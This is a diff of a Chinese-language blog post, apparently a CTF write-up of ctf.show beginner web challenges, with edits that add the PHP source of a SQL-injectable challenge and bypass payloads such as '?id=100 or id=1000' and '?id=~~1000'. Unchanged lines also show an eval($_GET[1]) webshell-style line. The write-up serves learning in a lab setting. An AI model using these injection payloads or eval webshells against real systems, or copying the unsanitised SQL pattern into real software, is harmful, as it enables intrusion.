@@ -33,7 +33,7 @@
 <meta property="og:image" content="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230729161502774.png?raw=true">
 <meta property="og:image" content="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230729162920083.png?raw=true">
 <meta property="article:published_time" content="2023-07-29T07:25:16.000Z">
-<meta property="article:modified_time" content="2023-07-29T08:39:22.424Z">
+<meta property="article:modified_time" content="2023-08-02T04:57:44.194Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230729161126553.png?raw=true">
@@ -198,10 +198,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2023-07-29 15:25:16 / Modified: 16:39:22" itemprop="dateCreated datePublished" datetime="2023-07-29T15:25:16+08:00">2023-07-29</time>
+              <time title="Created: 2023-07-29 15:25:16" itemprop="dateCreated datePublished" datetime="2023-07-29T15:25:16+08:00">2023-07-29</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-08-02 12:57:44" itemprop="dateModified" datetime="2023-08-02T12:57:44+08:00">2023-08-02</time>
+              </span>
 
           
 
@@ -261,7 +267,21 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=__&amp;__=___&amp;___=____&amp;____=_____&amp;_____=______&amp;______=_______&amp;_______=________&amp;________=_________&amp;_________=__________&amp;__________=___________&amp;___________=____________&amp;____________=_____________&amp;_____________=______________&amp;______________=_______________&amp;_______________=________________&amp;________________=_________________&amp;_________________=__________________&amp;__________________=___________________&amp;___________________=____________________&amp;____________________=_____________________&amp;_____________________=______________________&amp;______________________=_______________________&amp;_______________________=________________________&amp;________________________=_________________________&amp;_________________________=__________________________&amp;__________________________=___________________________&amp;___________________________=____________________________&amp;____________________________=_____________________________&amp;_____________________________=______________________________&amp;______________________________=_______________________________&amp;_______________________________=________________________________&amp;________________________________=_________________________________&amp;_________________________________=__________________________________&amp;__________________________________=___________________________________&amp;___________________________________=____________________________________&amp;____________________________________=eval($_GET[1]);</span><br></pre></td></tr></table></figure>
 
 <p>官方的话使用<code>_</code>而不是使用字母，</p>
+<h1 id="萌新"><a href="#萌新" class="headerlink" title="萌新"></a>萌新</h1><h2 id="web-1"><a href="#web-1" class="headerlink" title="web 1"></a>web 1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"> &lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"># 包含数据库连接文件</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line"># 判断get提交的参数id是否存在</span><br><span class="line">if(isset($_GET[&#x27;id&#x27;]))&#123;</span><br><span class="line">    $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    # 判断id的值是否大于999</span><br><span class="line">    if(intval($id) &gt; 999)&#123;</span><br><span class="line">        # id 大于 999 直接退出并返回错误</span><br><span class="line">        die(&quot;id error&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        # id 小于 999 拼接sql语句</span><br><span class="line">        $sql = &quot;select * from article where id = $id order by id limit 1 &quot;;</span><br><span class="line">        echo &quot;执行的sql为：$sql&lt;br&gt;&quot;;</span><br><span class="line">        # 执行sql 语句</span><br><span class="line">        $result = $conn-&gt;query($sql);</span><br><span class="line">        # 判断有没有查询结果</span><br><span class="line">        if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">            # 如果有结果，获取结果对象的值$row</span><br><span class="line">            while($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">                echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - title: &quot; . $row[&quot;title&quot;]. &quot; &lt;br&gt;&lt;hr&gt;&quot; . $row[&quot;content&quot;]. &quot;&lt;br&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        # 关闭数据库连接</span><br><span class="line">        $conn-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- flag in id = 1000 --&gt;</span><br><span class="line">&lt;/html&gt; </span><br></pre></td></tr></table></figure>
 
+
+
+<p>源码get传id，要求id不能大于999，还要等于1000</p>
+<p>pyload</p>
+<p><code>?id=~~1000</code>,</p>
+<h2 id="web1-web6"><a href="#web1-web6" class="headerlink" title="web1-web6"></a>web1-web6</h2><p>都可以此pyload</p>
+<p>但是都是非预期解</p>
+<p>预期解的话，在下一关的过滤中可以看到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">web1 :?id=100 or id=1000//就是用一个id小于999的来进行验证，然后再给他一个1000的值进行判断</span><br><span class="line">web2 ：相同的原理，直接为?id=100 ||id=1000</span><br><span class="line">web3 ：?id=100 ||id=1000</span><br><span class="line">web4 ：?id=100 ||id=1000</span><br><span class="line">web5 ：?id=~~1000</span><br><span class="line">web6 ：?id=~~1000</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web-7"><a href="#web-7" class="headerlink" title="web 7"></a>web 7</h2>
     </div>
 
     
@@ -341,7 +361,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%8F%9C%E7%8B%97%E6%9D%AF"><span class="nav-number">1.</span> <span class="nav-text">菜狗杯</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E7%AD%BE%E5%88%B0"><span class="nav-number">1.1.</span> <span class="nav-text">web签到</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web2-c0me-t0-s1gn"><span class="nav-number">1.2.</span> <span class="nav-text">web2 c0me_t0_s1gn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%88%91%E7%9A%84%E7%9C%BC%E9%87%8C%E5%8F%AA%E6%9C%89"><span class="nav-number">1.3.</span> <span class="nav-text">我的眼里只有$</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%8F%9C%E7%8B%97%E6%9D%AF"><span class="nav-number">1.</span> <span class="nav-text">菜狗杯</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E7%AD%BE%E5%88%B0"><span class="nav-number">1.1.</span> <span class="nav-text">web签到</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web2-c0me-t0-s1gn"><span class="nav-number">1.2.</span> <span class="nav-text">web2 c0me_t0_s1gn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%88%91%E7%9A%84%E7%9C%BC%E9%87%8C%E5%8F%AA%E6%9C%89"><span class="nav-number">1.3.</span> <span class="nav-text">我的眼里只有$</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%90%8C%E6%96%B0"><span class="nav-number">2.</span> <span class="nav-text">萌新</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web-1"><span class="nav-number">2.1.</span> <span class="nav-text">web 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web1-web6"><span class="nav-number">2.2.</span> <span class="nav-text">web1-web6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web-7"><span class="nav-number">2.3.</span> <span class="nav-text">web 7</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -355,7 +375,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-count">11</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
